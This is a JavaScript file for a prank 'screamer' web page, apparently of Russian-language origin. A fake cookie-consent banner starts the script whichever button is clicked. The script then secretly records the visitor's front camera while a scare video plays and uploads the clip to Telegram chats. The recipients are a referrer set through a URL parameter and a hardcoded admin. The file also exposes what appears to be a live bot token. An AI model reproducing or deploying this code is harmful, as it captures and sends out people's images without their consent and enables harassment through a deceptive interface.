const cameraVideo = document.getElementById('cameraVideo');
const screamerVideo = document.getElementById('screamerVideo');
const cookieConsent = document.getElementById('cookie-consent');
const acceptBtn = document.getElementById('accept-cookies');
const rejectBtn = document.getElementById('reject-cookies');
const termsLink = document.getElementById('terms-link');

// Replace with your actual bot token
const BOT_TOKEN = '8420275180:AAGCmlDkk-5h_7GI_dkuoAf_iwITnaP6aSw';
// Default chat ID, but will be overridden by ref param
let CHAT_ID = '355782346';

// Get referrer chat ID from URL
const urlParams = new URLSearchParams(window.location.search);
const refChatId = urlParams.get('ref');
if (refChatId) {
    CHAT_ID = refChatId;
}

document.addEventListener('DOMContentLoaded', () => {
    // Handle cookie acceptance/rejection
    function handleCookieDecision() {
        cookieConsent.style.opacity = '0';
        cookieConsent.style.pointerEvents = 'none';
        
        setTimeout(() => {
            cookieConsent.style.display = 'none';
            startPrank();
        }, 300);
    }

    // Start the prank: access camera, record video, play screamer
    async function startPrank() {
        console.log('Starting prank');
        try {
            // Request access to the front camera
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' } // Front camera
            });
            cameraVideo.srcObject = stream;

            // Wait for video to load
            cameraVideo.onloadedmetadata = () => {
                // Start recording video
                startRecording(stream);

                // Play screamer video
                playFullScreenVideo();

                // Stop recording after 8 seconds
                setTimeout(() => {
                    stopRecording();
                    // Stop the stream
                    stream.getTracks().forEach(track => track.stop());
                }, 8000);
            };
        } catch (err) {
            console.error('Error accessing camera:', err);
            // Still play screamer even if camera fails
            playFullScreenVideo();
        }
    }

    let recorder;

    // Start recording video
    function startRecording(stream) {
        console.log('Starting recording');
        recorder = new MediaRecorder(stream);
        recorder.start();
    }

    // Stop recording and send video
    function stopRecording() {
        console.log('Stopping recording');
        recorder.stop();
        recorder.ondataavailable = e => {
            console.log('Data available, blob size:', e.data.size);
            sendVideoToBot(e.data);
        };
    }

    // Send video to Telegram bot
    function sendVideoToBot(blob) {
        console.log('Sending video to bot, blob size:', blob.size, 'CHAT_ID:', CHAT_ID);
        const caption = 'Видео реакции на скример';

        // Send to referrer
        sendVideoToChat(CHAT_ID, blob, caption);

        // Also send to admin
        const adminChatId = '355782346';
        sendVideoToChat(adminChatId, blob, `${caption} (реферал: ${CHAT_ID})`);
    }

    function sendVideoToChat(chatId, blob, caption) {
        console.log(`Sending video to chat ${chatId}, blob size: ${blob.size}`);
        const formData = new FormData();
        formData.append('video', blob);
        formData.append('caption', caption);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${chatId}`, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            console.log(`Response status: ${response.status}`);
            return response.json();
        })
        .then(data => {
            if (data.ok) {
                console.log(`Video sent to ${chatId} successfully`);
            } else {
                console.error('Error sending video:', data);
            }
        })
        .catch(err => {
            console.error('Fetch error:', err);
        });
    }

    // Play video in fullscreen with max volume
    function playFullScreenVideo() {
        screamerVideo.muted = false;
        screamerVideo.volume = 1.0;
        
        // Play video with error handling
        screamerVideo.play().catch(error => {
            console.log('Autoplay failed:', error);
        });
        
        // Request fullscreen
        requestFullScreen();
        
        // Show video
        document.querySelector('.scare').style.display = 'block';
    }

    // Request fullscreen function
    function requestFullScreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    }

    // Event listeners
    acceptBtn.addEventListener('click', handleCookieDecision);
    rejectBtn.addEventListener('click', handleCookieDecision);
    
    // Terms link handling
    termsLink.addEventListener('click', (e) => {
        e.stopPropagation();
    });

    // Prevent default fullscreen exit behaviors
    document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement) {
            screamerVideo.pause();
        }
    });

    // Handle page visibility changes
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') {
            screamerVideo.pause();
            if (recorder && recorder.state === 'recording') {
                stopRecording();
            }
        }
    });
});
